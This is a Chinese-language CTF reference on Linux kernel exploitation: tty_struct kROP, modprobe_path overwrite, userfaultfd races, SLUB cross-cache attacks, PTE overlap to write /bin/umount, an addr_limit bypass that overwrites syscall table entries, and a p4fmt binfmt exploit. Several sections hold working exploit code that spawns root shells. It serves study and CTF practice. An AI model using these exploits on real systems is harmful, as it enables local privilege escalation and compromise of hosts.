# CTF Pwn - 内核利用技术

## Table of Contents
- [tty_struct RIP 劫持与 kROP](#tty_struct-rip-劫持与-krop)
  - [通过 tty_struct 上的伪造 vtable 实现 kROP](#通过-tty_struct-上的伪造-vtable-实现-krop)
  - [通过 ioctl 寄存器控制实现任意地址写](#通过-ioctl-寄存器控制实现任意地址写)
- [userfaultfd 稳定竞态](#userfaultfd-稳定竞态)
  - [替代竞态技术（uffd 不可用时）](#替代竞态技术uffd-不可用时)
- [SLUB 分配器内部机制](#slub-分配器内部机制)
  - [freelist 指针加固](#freelist-指针加固)
  - [freelist 混淆（CONFIG_SLAB_FREELIST_HARDEN）](#freelist-混淆config_slab_freelist_harden)
- [通过内核 panic 泄漏](#通过内核-panic-泄漏)
- [用 MADV_DONTNEED + mprotect 扩大竞态窗口（DiceCTF 2026）](#用-madv_dontneed--mprotect-扩大竞态窗口dicectf-2026)
- [CPU 分离策略的跨缓存攻击（DiceCTF 2026）](#cpu-分离策略的跨缓存攻击dicectf-2026)
- [PTE 重叠原语实现文件写（DiceCTF 2026）](#pte-重叠原语实现文件写dicectf-2026)
- [通过文件打开失败绕过内核 addr_limit（Midnight Sun CTF 2018）](#通过文件打开失败绕过内核-addr_limitmidnight-sun-ctf-2018)
- [自定义 binfmt 加载器越界读 + clear_user 提权（CONFidence Teaser 2019）](#自定义-binfmt-加载器越界读--clear_user-提权confidence-teaser-2019)

内核基础（环境搭建、堆喷结构、栈溢出、提权、modprobe_path、core_pattern）见 [kernel.md](kernel.md)。

保护绕过技术（KASLR、FGKASLR、KPTI、SMEP、SMAP）、GDB 调试、initramfs 工作流与利用模板见 [kernel-bypass.md](kernel-bypass.md)。

---

<a id="tty_struct-rip-hijack-and-krop"></a>
## tty_struct RIP 劫持与 kROP

<a id="krop-via-fake-vtable-on-tty_struct"></a>
### 通过 tty_struct 上的伪造 vtable 实现 kROP

在对 `tty_struct` 具备连续写入（至少 0x200 字节）的情况下，可以完全在该结构体内部搭建两阶段 kROP 链：

```text
tty_struct layout for kROP:
  +0x00: magic, kref   -> 0x5401 (preserve paranoia check)
  +0x08: dev            -> addr of `pop rsp` gadget (return addr after `leave`)
  +0x10: driver         -> &tty_struct + 0x170 (stack pivot target; must be valid kheap addr)
  +0x18: ops            -> &tty_struct + 0x50 (pointer to fake vtable)
  ...
  +0x50:                -> fake vtable (0x120 bytes), ioctl entry points to `leave` gadget
  ...
  +0x170:               -> actual ROP chain (commit_creds, prepare_kernel_cred, etc.)
```

**执行流程：**
1. `ioctl(ptmx_fd, cmd, arg)` -> `tty_ioctl()` -> 偏执检查通过（magic=0x5401）
2. `tty->ops->ioctl()` -> 跳到伪造 vtable 中的 `leave` gadget
3. `leave` = `mov rsp, rbp; pop rbp` —— RBP 指向 `tty_struct` 自身
4. RSP 现在指向 `tty_struct + 0x08`（`dev` 字段）
5. `ret` 到 `dev` 处的 `pop rsp` gadget，把 `driver` 弹出为新的 RSP
6. RSP 现在位于 `tty_struct + 0x170` -> 真正的 ROP 链开始执行

**关键洞察：** vtable 调用发生时 RBP 指向 `tty_struct`。`leave` 指令把栈枢轴到结构体内部，从而实现两阶段引导：先 `leave` 进入结构体，再 `pop rsp` 跳到 ROP 链区域。

**替代方案：** 许多内核中固定偏移处存在 `push rdx; ... pop rsp; ... ret` gadget，可借助 `ioctl` 的第三个参数直接完成栈枢轴（RDX 完全可控）：

```c
// ioctl(fd, cmd, arg) -> RDX = arg (64-bit controlled)
// Gadget: push rdx; mov ebp, imm; pop rsp; pop r13; pop rbp; ret
// Effect: RSP = arg -> ROP chain at user-specified address
ioctl(ptmx_fd, 0, (unsigned long)rop_chain_addr);
```

<a id="aaw-via-ioctl-register-control"></a>
### 通过 ioctl 寄存器控制实现任意地址写

当不需要完整 kROP 时，可用 `tty_struct` 实现任意地址写（AAW）来覆写 `modprobe_path`：

`ioctl(fd, cmd, arg)` 带来的寄存器控制：
- `cmd`（32 位）-> 部分控制 RBX、RCX、RSI
- `arg`（64 位）-> 完全控制 RDX、R8、R12

在伪造 vtable 中放写 gadget：`mov DWORD PTR [rdx], esi; ret`

```c
// Repeated ioctl calls write 4 bytes at a time to modprobe_path
for (int i = 0; i < 4; i++) {
    uint32_t val = *(uint32_t*)("/tmp/evil.sh\0\0\0\0" + i*4);
    ioctl(ptmx_fd, val, modprobe_path_addr + i*4);
}
```

---

<a id="userfaultfd-race-stabilization"></a>
## userfaultfd 稳定竞态

`userfaultfd`（uffd）通过在缺页时暂停执行，让内核竞态条件变得确定可控。

**原理：**
1. 用 `MAP_PRIVATE` `mmap()` 一块区域（不分配物理页）
2. 通过 `ioctl(UFFDIO_REGISTER)` 把该区域注册给 `userfaultfd`
3. 内核访问该区域时（例如在 `copy_from_user()` 中）触发缺页
4. 触发缺页的内核线程阻塞，直到用户态处理该缺页
5. 阻塞期间，利用代码修改共享状态（释放对象、堆喷等）
6. 用户态通过 `ioctl(UFFDIO_COPY)` 解决缺页，内核线程恢复执行

```c
// Setup
int uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
struct uffdio_api api = { .api = UFFD_API, .features = 0 };
ioctl(uffd, UFFDIO_API, &api);

// Register mmap'd region
void *region = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE,
                    MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
struct uffdio_register reg = {
    .range = { .start = (unsigned long)region, .len = 0x1000 },
    .mode = UFFDIO_REGISTER_MODE_MISSING
};
ioctl(uffd, UFFDIO_REGISTER, &reg);

// Fault handler thread
void *handler(void *arg) {
    struct pollfd pfd = { .fd = uffd, .events = POLLIN };
    while (poll(&pfd, 1, -1) > 0) {
        struct uffd_msg msg;
        read(uffd, &msg, sizeof(msg));
        // >>> RACE WINDOW: kernel thread is paused <<<
        // Free target object, spray heap, etc.

        // Resolve fault to resume kernel
        struct uffdio_copy copy = {
            .dst = msg.arg.pagefault.address & ~0xFFF,
            .src = (unsigned long)src_page,
            .len = 0x1000
        };
        ioctl(uffd, UFFDIO_COPY, &copy);
    }
}
```

**跨页切分对象：** 把内核对象摆放成跨页边界。第一页正常，第二页触发 uffd。内核处理完前半部分后在第二页阻塞 —— 竞态窗口就出现在操作中途。

<a id="alternative-race-techniques-uffd-disabled"></a>
### 替代竞态技术（uffd 不可用时）

当 `CONFIG_USERFAULTFD` 被禁用，或 uffd 仅限 root 使用时：

1. **超大 `copy_from_user()` 缓冲区：** 传入巨大缓冲区拖慢拷贝操作，扩大竞态窗口
2. **CPU 绑核 + 重量级系统调用：** 把参与竞态的线程绑到同一核心；用耗时的内核函数延长时序窗口
3. **反复重试：** 纯竞态、不做稳定化 —— 循环跑利用。成功率视时序从 1% 到 50% 不等
4. **基于 TSC 的时序（上下文保守）：** 进入临界区前循环读取 TSC（Time Stamp Counter），确认自己正处于 CFS 时间片开头 —— 减少竞态期间的调度器抢占

---

<a id="slub-allocator-internals"></a>
## SLUB 分配器内部机制

<a id="freelist-pointer-hardening"></a>
### freelist 指针加固

从内核 5.7+ 起，SLUB 对象中的空闲指针放在对象**中部**（按字对齐），而不是偏移 0：

```c
// From mm/slub.c
if (freepointer_area > sizeof(void *)) {
    s->offset = ALIGN(freepointer_area / 2, sizeof(void *));
}
```

**影响：** 从空闲 chunk 起始处发起的简单缓冲区溢出够不到空闲指针。来自相邻 chunk 的下溢出仍可能有效。

<a id="freelist-obfuscation-config_slab_freelist_harden"></a>
### freelist 混淆（CONFIG_SLAB_FREELIST_HARDEN）

启用后，空闲指针会与每个 cache 的随机值做 XOR 混淆：

```text
stored_ptr = real_ptr ^ kmem_cache->random
```

**检测：** 在 GDB 中找到 `kmem_cache_cpu`（经 `$GS_BASE + kmem_cache.cpu_slab` 偏移），沿着 `freelist` 指针查看存储值是否像合法的内核地址。若不像，说明混淆已启用。

---

<a id="leak-via-kernel-panic"></a>
## 通过内核 panic 泄漏

当 KASLR 关闭（或布局已知）且内核使用 `initramfs` 时：

```nasm
jmp &flag   ; jump to the address of the flag file content in memory
```

内核会 panic，而 panic 消息的 `CODE` 段会包含出错指令的字节 —— 这些字节就是 flag 内容。

**前提条件：** 无 KASLR（或完全掌握布局）、`initramfs`（flag 已载入内核内存）、可控 RIP。

---

<a id="race-window-extension-via-madv_dontneed--mprotect-dicectf-2026"></a>
## 用 MADV_DONTNEED + mprotect 扩大竞态窗口（DiceCTF 2026）

**模式（cornelslop）：** 内核模块在检查路径与删除路径之间存在 TOCTOU 竞态，但窗口太窄难以稳定命中。在耗时的内核操作期间强制反复触发缺页，可把竞态窗口从毫秒级拉长到几十秒。

**技术：**
1. 映射内核检查操作会用到的内存（例如 `sha256_va_range()` 读取的用户态页）
2. 在第二个线程中循环执行 `MADV_DONTNEED`（丢弃页表项）+ `mprotect()`（切换权限）
3. 内核计算哈希期间的每次缺页都强制获取 VMA 锁并处理缺页
4. 内核操作反复停顿，竞态窗口因此一直保持打开

```c
// Thread 1: trigger the vulnerable CHECK ioctl (long-running hash)
ioctl(fd, CHECK_ENTRY, &entry);

// Thread 2: extend race window by forcing repeated faults
while (racing) {
    madvise(buf, PAGE_SIZE, MADV_DONTNEED);  // drop PTE
    mprotect(buf, PAGE_SIZE, PROT_READ);      // force fault on next access
    mprotect(buf, PAGE_SIZE, PROT_READ | PROT_WRITE);  // restore
}

// Thread 3: trigger the concurrent DEL ioctl
ioctl(fd, DEL_ENTRY, &entry);  // races with CHECK path
```

**关键洞察：** `MADV_DONTNEED` 丢弃页表项但不释放底层物理页。内核下次访问该用户态内存时（例如在哈希计算中）就会缺页，必须重新建立映射。配合 `mprotect()` 反复切换权限，产生的锁竞争能把任何触及用户态页的内核操作从亚毫秒级拉长到数十秒 —— 让原本不现实的竞态条件变成可靠的利用。

---

<a id="cross-cache-attack-via-cpu-split-strategy-dicectf-2026"></a>
## CPU 分离策略的跨缓存攻击（DiceCTF 2026）

**模式（cornelslop）：** 漏洞对象位于专用 SLUB cache（不是 `kmalloc-*`），double-free 之后无法在同 cache 内回收。把分配与释放分散到不同 CPU 上，可把页从专用 cache 挤出到 buddy 分配器。

**技术：**
1. **在 CPU 0 上分配 N 个对象** —— 填满 CPU 0 partial 链表上的 slab 页
2. **在 CPU 1 上释放同一批对象** —— 释放的对象进入 CPU 1 的 partial 链表（而非 CPU 0 的）
3. CPU 1 的 partial 链表溢出到 **node partial 链表**
4. 完全为空的 slab 被归还到 **PCP（per-CPU page）链表**，进而回到 **buddy 分配器**
5. 把这些页重新分配为其他对象类型（例如页表）

```c
// Pin allocation thread to CPU 0
cpu_set_t set;
CPU_ZERO(&set);
CPU_SET(0, &set);
sched_setaffinity(0, sizeof(set), &set);

// Allocate MAX_ENTRIES objects (fills ~3 slab pages)
for (int i = 0; i < MAX_ENTRIES; i++)
    ioctl(fd, ALLOC_ENTRY, &entries[i]);

// Pin free thread to CPU 1
CPU_SET(1, &set);
sched_setaffinity(0, sizeof(set), &set);

// Free from different CPU — objects land on CPU 1's partial list
for (int i = 0; i < MAX_ENTRIES; i++)
    ioctl(fd, FREE_ENTRY, &entries[i]);
// Empty slabs flow: CPU1 partial → node partial → PCP → buddy allocator
```

**关键洞察：** SLUB 按 CPU 分配与释放。对象在与分配时不同的 CPU 上被释放，就会进入另一条 partial 链表。该链表溢出后，空 slab 被归还给 buddy 分配器 —— 从而彻底脱离专用 cache。这让跨缓存攻击对那种免疫标准堆喷的 `kmem_cache_create()` 自定义 cache 也有效。

---

<a id="pte-overlap-primitive-for-file-write-dicectf-2026"></a>
## PTE 重叠原语实现文件写（DiceCTF 2026）

**模式（cornelslop）：** 把释放的页回收为 PTE（页表项）页之后，让一块匿名可写映射与一块只读文件映射重叠，通过被破坏的 PTE 让二者落到同一物理页。

**技术：**
1. 触发跨缓存 double-free，把某一页送回 buddy 分配器
2. 新建匿名映射 —— 内核把该释放页用作 PTE 页
3. 把只读文件（例如 `/bin/umount`）映射到同一 PTE 区域
4. 被破坏的 PTE 页现在有表项指向该文件的物理页
5. 通过匿名（可写）映射写入 -> 直接修改文件页
6. 覆写文件的 shebang/头部，执行攻击者脚本

```c
// After cross-cache frees page into buddy allocator:

// 1. Anonymous mapping reclaims the page as PTE storage
char *anon = mmap(NULL, PAGE_SIZE * 512, PROT_READ | PROT_WRITE,
                  MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
// Touch pages to populate PTEs in the reclaimed page
for (int i = 0; i < 512; i++)
    anon[i * PAGE_SIZE] = 'A';

// 2. File mapping into overlapping virtual range
int file_fd = open("/bin/umount", O_RDONLY);
char *file_map = mmap(target_addr, PAGE_SIZE, PROT_READ,
                      MAP_PRIVATE | MAP_FIXED, file_fd, 0);

// 3. Write through anonymous side corrupts file content
// Overwrite ELF header / shebang with #!/tmp/pwn
memcpy(anon + offset, "#!/tmp/pwn\n", 11);

// 4. Execute the corrupted binary → runs attacker script as root
system("/bin/umount /tmp 2>/dev/null");
```

**关键洞察：** PTE 页只是被内核页表分配器挪作他用的普通物理页。若一块释放的 slab 页被回收为 PTE 页，原有的（已损坏的）slab 表项与新的 PTE 表项会共存。只要让匿名映射与文件映射重叠在同一 PTE 页上，对匿名映射的写入就会透明地修改文件页 —— 无需任何直接的内核写原语即可实现任意文件写。由于写入发生在物理页层面，所有标准文件权限检查都被绕过。

---

<a id="kernel-addr_limit-bypass-via-failed-file-open-midnight-sun-ctf-2018"></a>
## 通过文件打开失败绕过内核 addr_limit（Midnight Sun CTF 2018）

**模式：** 内核模块调用 `set_fs(KERNEL_DS)` 以便访问用户态指针，但若随后打开文件失败，就直接返回而没有恢复旧的 `addr_limit`。只要让目标文件是个目录就能制造这次失败。此后用户态 `read()` 即可访问内核内存。

**利用思路：**
1. 内核模块有个 debug 函数，为读取调试文件而设置 `addr_limit = KERNEL_DS`
2. 若 `filp_open()` 失败（例如目标是目录而非普通文件），错误路径提前返回
3. 该错误路径**没有**把 `addr_limit` 恢复为之前的值（`USER_DS`）
4. 调用进程此后永久持有 `addr_limit = KERNEL_DS`
5. 普通 `read()`/`write()` 系统调用从此可访问内核内存地址
6. 借此把系统调用表项覆盖为 `prepare_kernel_cred`/`commit_creds`

```c
#include <sys/stat.h>
#include <unistd.h>
#include <fcntl.h>

#define DEBUG_FILE "/tmp/debug_log"
#define SYS_TABLE_ADDR 0xffffffff81801400  // from /proc/kallsyms

// Step 1: Make debug file a directory -> filp_open() fails with -EISDIR
mkdir(DEBUG_FILE, 0);

// Step 2: Trigger the kernel module's debug function
int fd = open("/dev/vuln_module", O_RDWR);
read(fd, &c, 1);  // Triggers debug_msg(), leaves addr_limit = KERNEL_DS

// Step 3: Now read()/write() can access kernel memory
// Use pipe as a kernel-memory read/write primitive:
int pipefd[2];
pipe(pipefd);

// Write prepare_kernel_cred address to syscall 100
unsigned long pkc_addr = 0xffffffff810a9ef0;  // prepare_kernel_cred
write(pipefd[1], &pkc_addr, sizeof(pkc_addr));
read(pipefd[0], (void*)((unsigned long*)SYS_TABLE_ADDR + 100), sizeof(unsigned long));

// Write commit_creds address to syscall 101
unsigned long cc_addr = 0xffffffff810a9d80;  // commit_creds
write(pipefd[1], &cc_addr, sizeof(cc_addr));
read(pipefd[0], (void*)((unsigned long*)SYS_TABLE_ADDR + 101), sizeof(unsigned long));

// Step 4: Call the overwritten syscalls to get root
int creds = syscall(100, 0);   // prepare_kernel_cred(0)
syscall(101, creds);            // commit_creds(creds)
// Now running as root
system("/bin/sh");
```

**关键洞察：** 内核模块为访问内核指针把 `addr_limit` 设为 `KERNEL_DS`、却在错误路径上忘记恢复时，用户态进程就会保留被提升的 `addr_limit`。这使普通 `read()`/`write()` 系统调用变成内核内存读写原语。审查内核模块错误路径时务必留意缺失的 `set_fs()` 恢复 —— 触发该错误（例如把文件路径指向目录）往往非常简单。

**参考：** Midnight Sun CTF 2018

---

<a id="custom-binfmt-loader-oob-read--clear_user-for-privesc-confidence-teaser-2019"></a>
## 自定义 binfmt 加载器越界读 + clear_user 提权（CONFidence Teaser 2019）

**模式（p4fmt）：** 内核模块 `p4fmt.ko` 为以 `"P4"` 开头的文件注册新的 `binfmt` 处理器。加载器读取用户可控的头部：`{magic, version, arg, load_count, header_offset, entry}`，随后是 `load_count` 条 `{addr, length, offset}` 表项。两处缺失的检查让它成为完整的提权原语：`header_offset` 未经校验直接作为偏移量用于 `bprm->buf[]`（越界读取内核侧的 `linux_binprm` 结构，内含 `struct cred *cred`）；而 `loads[i].addr | 8` 会选中一个分支，以完全由攻击者控制的参数调用 `_clear_user(addr, length)` —— 一个任意清零原语，并且执行时机在 `install_exec_creds()` 提交 `bprm->cred` **之前**。

```python
from pwn import *

# Stage 1: leak bprm->cred via OOB header_offset into the kernel-side linux_binprm buffer.
# load_count=5, header_offset=0x80-0x18 -> loads[] parsed from fields past bprm->buf.
leak = b'P4' + p8(0) + p8(1) + p32(5) + p64(0x80 - 0x18) + p64(0)
# Execute -> dmesg "vm_mmap(..., length=<cred_addr>, ...)" reveals the cred pointer.

# Stage 2: zero uid/gid/suid/sgid/euid/egid/fsuid/fsgid in bprm->cred via clear_user.
# arg=1 with load entries whose addr has bit 3 set -> kernel calls _clear_user(addr, length).
cred = 0xffff...          # from leak
entries  = p64(0x7000000 | 7) + p64(0x1000) + p64(0)            # mmap RWX page for shellcode
entries += p64((cred + 0x10) | 8) + p64(0x48) + p64(0)          # clear_user(cred->uid..fsgid)
binary   = b'P4' + p8(0) + p8(1) + p32(2) + p64(0x18) + p64(0x7000090) + entries
binary   = binary.ljust(0x7000090 & 0xfff, b'\x00') + asm(shellcraft.sh())
# exec -> install_exec_creds sees a cred with uid=0 -> root shell (drop_privileges bypass)
```

**关键洞察：** 自定义 `binfmt_misc` 风格加载器是肥美目标，因为它们在 `install_exec_creds` 提交本次 exec 的凭据结构**之前**就解析攻击者提供的头部。任何在此窗口内触碰 `bprm` 的原语（越界读取泄漏 `bprm->cred`、任意 `_clear_user` 清零 cred 字段、可控 flags/prot 的 `vm_mmap` 获得内核协助的 RWX）都能组合成提权，无需传统的内核内存破坏链。审查自定义模块中的 `load_*_binary` 函数时务必检查：(a) 头部偏移量与计数的边界；(b) 传给 `_clear_user`/`copy_to_user` 的 `addr`/`length` 是否做了 `access_ok`/范围检查；(c) 通过 `printk` 产生的侧信道信息泄漏。

**参考：** CONFidence CTF 2019 Teaser — p4fmt，writeup 13992
